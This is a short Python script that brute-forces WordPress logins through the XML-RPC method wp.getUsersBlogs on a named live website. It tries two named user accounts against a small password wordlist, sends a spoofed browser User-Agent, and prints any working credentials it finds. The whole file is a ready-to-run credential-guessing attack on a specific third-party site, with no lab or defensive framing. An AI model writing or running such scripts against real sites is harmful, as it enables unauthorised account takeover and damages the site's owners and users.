import urllib.request
import urllib.error
import time

url = "https://doktorbajskorv.se/xmlrpc.php"
users = ["nalle", "lompa"]
passwords = ["password", "secret", "123456", "nalle123", "lompa123", "bajskorv", "admin", "admin123"]

for user in users:
    print(f"\n[*] Testing user: {user}")
    for pwd in passwords:
        xml_data = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{user}</string></value></param>
    <param><value><string>{pwd}</string></value></param>
  </params>
</methodCall>""".encode('utf-8')

        req = urllib.request.Request(
            url, 
            data=xml_data, 
            headers={
                'Content-Type': 'text/xml',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        try:
            with urllib.request.urlopen(req) as response:
                res_body = response.read().decode('utf-8')
                if "faultCode" in res_body:
                    print(f"[-] Failed: {user}:{pwd}")
                else:
                    print(f"\n[+] SUCCESS! Credentials found -> {user}:{pwd}")
                    exit(0)
        except urllib.error.HTTPError as e:
            print(f"[!] HTTP Error {e.code} with {user}:{pwd} - {e.reason}")
        except Exception as e:
            print(f"[!] Error with {user}:{pwd}: {e}")
        
        time.sleep(2)

print("\n[*] Scan finished. No matches found in the current wordlist.")
